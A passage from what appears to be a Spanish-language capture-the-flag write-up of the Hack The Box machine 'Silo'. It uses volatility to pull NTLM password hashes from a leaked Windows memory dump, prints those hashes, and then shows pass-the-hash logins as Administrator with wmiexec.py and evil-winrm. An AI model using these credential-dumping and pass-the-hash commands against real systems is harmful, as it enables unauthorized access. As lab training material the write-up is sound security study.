❭ cat Oracle.txt
...
link password:
�%Hm8646uC$
```

Jmmm, parece que hay un simbolo extraño, si validamos el contenido del archivo en la web (apoyandonos del servidor web, quizas asi interprete algo distinto) vemos otro resultado de contraseña:

```txt
...
link password:
Ł%Hm8646uC$
```

Pero tampoco nos funciona :(

De nuevo dando vueltas, pero ahora jugando con la web-shell para desde ahí leer el contenido del archivo, obtenemos otra contraseña distinta:

```txt
...
link password:
£%Hm8646uC$
```

Probandola ahora si nos permite acceder al recurso :)

![131google_dropbox_unlock_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131google_dropbox_unlock_done.png)

Perfeeeeeee o.O tamos, descarguemos el archivo `.zip` y empecemos a jugar...

#### Zip File (Memory Dump) - Volatility

Decomprimimos:

```bash
❭ unzip SILO-20180105-221806.zip 
Archive:  SILO-20180105-221806.zip
  inflating: SILO-20180105-221806.dmp
```

Entooooonces, tenemos un archivo que contiene un volcado de memoria...

> **Memory dump** es un registro no estructurado del contenido de la memoria en un momento concreto, generalmente utilizado para depurar un programa que ha finalizado su ejecución incorrectamente. [volcado de memoria](https://es.wikipedia.org/wiki/Volcado_de_memoria).

* [Más info sobre los volcados de memoria y su importancia](https://revista.seguridad.unam.mx/numero-17/an%C3%A1lisis-de-volcado-de-memoria-en-investigaciones-forenses-computacionales).

Listos, dando unas vuelticas encontramos varias referencias hacia la herramienta [volatility](https://github.com/volatilityfoundation/volatility) la cual en términos generales nos permite saber si un equipo ha sido infectado o no, nos permite recorrer los procesos que están en ejecución mientras se hace el volcado para posteriormente analizarlos.

Lo primero que debemos hacer es obtener (o un indicio) el perfil (sistema operativo, servicio de empaquetado y arquitectura (32 o 64 bits)) del cual viene el volcado, para esto usaremos [imageinfo](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#imageinfo):

```bash
❭ volatility imageinfo -f SILO-20180105-221806.dmp
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win8SP0x64, Win10x64_17134, Win81U1x64, Win10x64_10240_17770, Win10x64_14393, Win10x64_10586, Win10x64, Win2012R2x64_18340, Win10x64_16299, Win2012R2x64, Win2016x64_14393, Win2012x64, Win8SP1x64_18340, Win8SP1x64, Win10x64_15063 (Instantiated with Win10x64_15063)
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/silo/content/dump/SILO-20180105-221806.dmp)
                      PAE type : No PAE
                           DTB : 0x1a7000L
                          KDBG : 0xf80078520a30L
          Number of Processors : 2
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff8007857b000L
                KPCR for CPU 1 : 0xffffd000207e8000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2018-01-05 22:18:07 UTC+0000
     Image local date and time : 2018-01-05 22:18:07 +0000
```

Vemos vaaaarios perfiles (**Suggested Profile(s)**), por lo tanto si recordamos al inicio que mediante `crackmapexec` vimos algo relacionado con **Windows 2012**, pues para aclararlo apoyémonos del comando `systeminfo` en la máquina:

```powershell
PS C:\Users\Phineas\Desktop> systeminfo

Host Name:                 SILO
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-00115-23036-AA976
Original Install Date:     12/31/2017, 11:01:23 PM
System Boot Time:          4/20/2021, 4:28:44 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
...
```

Bien, **Microsoft Windows Server 2012 R2 Standard** con arquitectura de **64 bits**.

Entonces tenemos 3 opciones de perfil:

* **Win2012R2x64_18340**.
* **Win2012R2x64**.
* **Win2012x64**.

Escojamos **Win2012R2x64** que se ve sencillito u.u y sigamos (:

Ahora podemos ver un árbol de procesos que se estaban ejecutando al momento de hacer el dump mediante el argumento [pstree](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#pstree):

```bash
❭ volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 pstree
Volatility Foundation Volatility Framework 2.6

Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffffe000034ac940:wininit.exe                       404    316      4      0 2018-01-05 22:17:16 UTC+0000
. 0xffffe00003550940:services.exe                     492    404     10      0 2018-01-05 22:17:16 UTC+0000
.. 0xffffe00003fe3940:svchost.exe                     832    492     20      0 2018-01-05 22:17:17 UTC+0000
.. 0xffffe00004fff080:VGAuthService.                 1324    492      3      0 2018-01-05 22:17:18 UTC+0000
.. 0xffffe000030a1080:dllhost.exe                    1432    492     21      0 2018-01-05 22:17:27 UTC+0000
.. 0xffffe00004e267c0:svchost.exe                     920    492     25      0 2018-01-05 22:17:17 UTC+0000
.. 0xffffe00003f68940:vmacthlp.exe                    708    492      2      0 2018-01-05 22:17:16 UTC+0000
.. 0xffffe000030b7940:dllhost.exe                    1600    492     17      0 2018-01-05 22:17:27 UTC+0000
.. 0xffffe00004f5c940:svchost.exe                    1052    492     11      0 2018-01-05 22:17:17 UTC+0000
.. 0xffffe00003fcc940:svchost.exe                     800    492     63      0 2018-01-05 22:17:17 UTC+0000
... 0xffffe000061637c0:taskhostex.exe                2368    800      7      0 2018-01-05 22:17:33 UTC+0000
.. 0xffffe0000608f780:vmtoolsd.exe                   1444    492      8      0 2018-01-05 22:17:18 UTC+0000
.. 0xffffe00004f84940:oracle.exe                     1088    492     30      0 2018-01-05 22:17:17 UTC+0000
.. 0xffffe00003f22500:svchost.exe                     560    492     15      0 2018-01-05 22:17:16 UTC+0000
... 0xffffe00003224540:WmiPrvSE.exe                  3056    560     19      0 2018-01-05 22:17:47 UTC+0000
... 0xffffe00003239940:WmiPrvSE.exe                  2340    560     10      0 2018-01-05 22:17:47 UTC+0000
... 0xffffe0000315f940:SppExtComObj.E                2312    560      5      0 2018-01-05 22:17:29 UTC+0000
... 0xffffe000030cd940:WmiPrvSE.exe                  1440    560     12      0 2018-01-05 22:17:27 UTC+0000
.. 0xffffe00004f2e940:spoolsv.exe                     308    492     13      0 2018-01-05 22:17:17 UTC+0000
.. 0xffffe00004fef940:TNSLSNR.EXE                    1208    492      5      0 2018-01-05 22:17:18 UTC+0000
.. 0xffffe00003117940:VSSVC.exe                      2228    492      7      0 2018-01-05 22:17:29 UTC+0000
.. 0xffffe000030cf940:msdtc.exe                      2052    492     13      0 2018-01-05 22:17:27 UTC+0000
.. 0xffffe00004e8d940:svchost.exe                     340    492     16      0 2018-01-05 22:17:17 UTC+0000
.. 0xffffe00003f39940:svchost.exe                     604    492     15      0 2018-01-05 22:17:16 UTC+0000
.. 0xffffe000060c7940:svchost.exe                    1516    492     16      0 2018-01-05 22:17:19 UTC+0000
.. 0xffffe0000325c940:WmiApSrv.exe                    864    492      5      0 2018-01-05 22:17:48 UTC+0000
.. 0xffffe00003051940:svchost.exe                    2000    492      5      0 2018-01-05 22:17:27 UTC+0000
.. 0xffffe00003077880:TPAutoConnSvc.                 1256    492      8      0 2018-01-05 22:17:27 UTC+0000
... 0xffffe0000301c940:TPAutoConnect.                2824   1256      3      0 2018-01-05 22:17:37 UTC+0000
.... 0xffffe00003f698c0:conhost.exe                  2832   2824      1      0 2018-01-05 22:17:37 UTC+0000
.. 0xffffe00004fe93c0:OraClrAgnt.exe                 1192    492      2      0 2018-01-05 22:17:18 UTC+0000
... 0xffffe00004ff0300:agtctl.exe                    1216   1192      0 ------ 2018-01-05 22:17:18 UTC+0000
... 0xffffe000060568c0:agtctl.exe                    1348   1192      0 ------ 2018-01-05 22:17:18 UTC+0000
... 0xffffe000060767c0:agtctl.exe                    1388   1192      0 ------ 2018-01-05 22:17:18 UTC+0000
... 0xffffe00004ff3940:agtctl.exe                    1264   1192      0 ------ 2018-01-05 22:17:18 UTC+0000
.. 0xffffe00003149080:sppsvc.exe                     2284    492      5      0 2018-01-05 22:17:29 UTC+0000
.. 0xffffe00004ffc440:svchost.exe                    1272    492      4      0 2018-01-05 22:17:18 UTC+0000
.. 0xffffe000060a62c0:ManagementAgen                 1492    492      9      0 2018-01-05 22:17:18 UTC+0000
.. 0xffffe00003fb9080:svchost.exe                     764    492     16      0 2018-01-05 22:17:17 UTC+0000
. 0xffffe00003ed4080:lsass.exe                        500    404      6      0 2018-01-05 22:17:16 UTC+0000
 0xffffe000034f54c0:csrss.exe                         324    316     10      0 2018-01-05 22:17:15 UTC+0000
 0xffffe00000df34c0:ServerManager.                   2732   2376     24      0 2018-01-05 22:17:35 UTC+0000
 0xffffe00000089940:System                              4      0     84      0 2018-01-05 22:17:14 UTC+0000
. 0xffffe00000c9c100:smss.exe                         208      4      3      0 2018-01-05 22:17:14 UTC+0000
 0xffffe000034ec380:csrss.exe                         396    388     10      0 2018-01-05 22:17:16 UTC+0000
 0xffffe00002fee080:winlogon.exe                      448    388      5      0 2018-01-05 22:17:16 UTC+0000
. 0xffffe00003f6f680:dwm.exe                          688    448      9      0 2018-01-05 22:17:16 UTC+0000
 0xffffe00004e00680:explorer.exe                     2424   2416     56      0 2018-01-05 22:17:33 UTC+0000
. 0xffffe0000136d080:vmtoolsd.exe                    2992   2424      8      0 2018-01-05 22:17:45 UTC+0000
. 0xffffe00003203340:DumpIt.exe                      2932   2424      4      0 2018-01-05 22:18:06 UTC+0000
.. 0xffffe00003f8c940:conhost.exe                    2764   2932      2      0 2018-01-05 22:18:06 UTC+0000
```

Vale, tenemos los procesos siendo ejecutados mientras se efectúa el volcado de memoria. Después de un buen rato pensando que todos eran malignos o algo por el estilo y jugar con volatility pa ver que hacer :P Encontré un argumento interesante, el cual nos muestra los últimos comandos del sistema efectuados por cada proceso (los que vimos antes), esto hecho mediante `cmdline`:

```bash
❭ volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 cmdline
...
# Muchas coooooooosas
...
************************************************************************
DumpIt.exe pid:   2932
Command line : "C:\Users\Administrator\Desktop\DumpIt.exe" 
************************************************************************
...
```

Encontramos la ruta de este binario, la cual hace referencia al usuario administrador :x, veamos si podemos jugar con esto...

(**Y no, después de un rato siguiendo [esta guia](https://medium.com/@zemelusa/first-steps-to-volatile-memory-analysis-dcbd4d2d56a1) no logre ver nada interesante ante ese binario**)

Leyendo la [wiki](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) vemos cositas interesantes relacionadas con los [registros del sistema](https://es.wikipedia.org/wiki/Registro_de_Windows).:

* [Volatility wiki - Registry](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#registry).

Estas opciones nos sirven para encontrar las direcciones en memoria de las llaves de los distintos registros usados en **Windows** ([Registry Hives](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)).

> A *hive* is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in. [Registry Hives](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

Tenemos el argumento [hivelist](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#hivelist) que nos da una lista de los registros con su dirección en memoria, path y nombre específicos, así sabemos cuál es de cuál :)

```bash
❭ volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hivelist
Volatility Foundation Volatility Framework 2.6

Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat
```

Bien, tenemos el registro **SAM** y el registro **SYSTEM**, estos son importantes, ya que los dos contienen las contraseñas de los usuarios del sistema en formato hash (LM (Lan Manager) hash y [NTLM](https://www.ionos.es/digitalguide/servidores/know-how/ntlm/) hash).

* [Info - Registry **SAM**](https://en.wikipedia.org/wiki/Security_Account_Manager).
* [Info - What is **SAM** (Security Account Manager)](https://www.top-password.com/blog/tag/windows-sam-registry-file/).
* [Info - Registry: HKEY_LOCAL_MACHINE\SAM](https://renenyffenegger.ch/notes/Windows/registry/tree/HKEY_LOCAL_MACHINE/SAM/index).
* [Info - Windows registry information for advanced users](https://docs.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users).

Así que podemos aprovechar que sabemos su dirección en memoria para mediante [hashdump](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#hashdump) intentar que nos muestre los hashes de los usuarios:

```bash
❭ volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 -y 0xffffc00000028000 -s 0xffffc00000619000 hashdump
```

* `-y`: Tiene la direccion **virtual** del registro **SYSTEM**.
* `-s`: Tiene la direccion **virtual** del registro **SAM**.

```bash
❭ volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 -y 0xffffc00000028000 -s 0xffffc00000619000 hashdump
Volatility Foundation Volatility Framework 2.6

Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```

Oko, tenemos hashes, ahora la parte más fácil

Podemos usar vaaaaaarias herramientas y hacer **PassTheHash** (e incluso intentar crackear los hashes, pero ya hemos visto en otros writeups como hacerlo, juguemos con los hashes), usaremos 2 opciones, `wmiexec` y `crackmapexec`:

#### PassTheHash - wmiexec

* [Youtube - S4vitar nos guia con el uso de **winexec**](https://www.youtube.com/watch?v=0rmG5EneRuQ&t=5779s).

Entonces, sencillamente tomamos la última parte del hash y escribimos:

```bash
❭ wmiexec.py -hashes :9e730375b7cbcebf74ae46481e07b0c7 Administrator@10.10.10.82
```

Esperamos un momento yy:

![131bash_passhash_winexec_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131bash_passhash_winexec_admin.png)

Perfectamente correcto e.e Ya estaríamos dentro como el usuario administrador y jugar con el sistema. Pero validemos si **Phineas** también nos permite entrar:

```bash
❭ wmiexec.py -hashes :8eacdd67b77749e65d3b3d5c110b0969 Phineas@10.10.10.82
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

Pero no :(

### PassTheHash - evil-winrm

* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm).

Si recordamos, en nuestro escaneo vimos el puerto **5986**, el cual hace referencia al servicio de Windows [WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management). Entonces [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) nos ayuda a explotar este servicio para obtener una PowerShell ya sea con credenciales o como en nuestro caso, con un hash:

```bash
❭ evil-winrm -i 10.10.10.82 -u Administrator -H 9e730375b7cbcebf74ae46481e07b0c7
```

![131bash_passhash_evilwinrm_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131bash_passhash_evilwinrm_admin.png)

Perfecto otra vez :) Volvamos a intentar con **Phineas** a veeeer:

```bash
❭ evil-winrm -i 10.10.10.82 -u Phineas -H 8eacdd67b77749e65d3b3d5c110b0969

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
```

Pero no, error de nuevo :(

...

Igual siendo administradores (y no siéndolo) podemos ver el contenido de **Phineas**.

Acá podríamos crearnos usuarios, mover registros, deshabilitar otros, jugar con privilegios, etc, jugar mucho. Pero por ahora, hemos terminado :D Solo nos queda ver las flags.

![131flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/silo/131flags.png)

...

Linda máquina, la parte forense me gusto mucho, pensar en el peligro de que se filtre un volcado de memoria. Me gusto mucho esa parte.

Y bueno, nos leeremos en otra ocasión, claro que si! Bendiciones y como siempreeeeeeeeeeeeeeeeeeeeeeee, a, seguir, rompiendo, todoooooooo.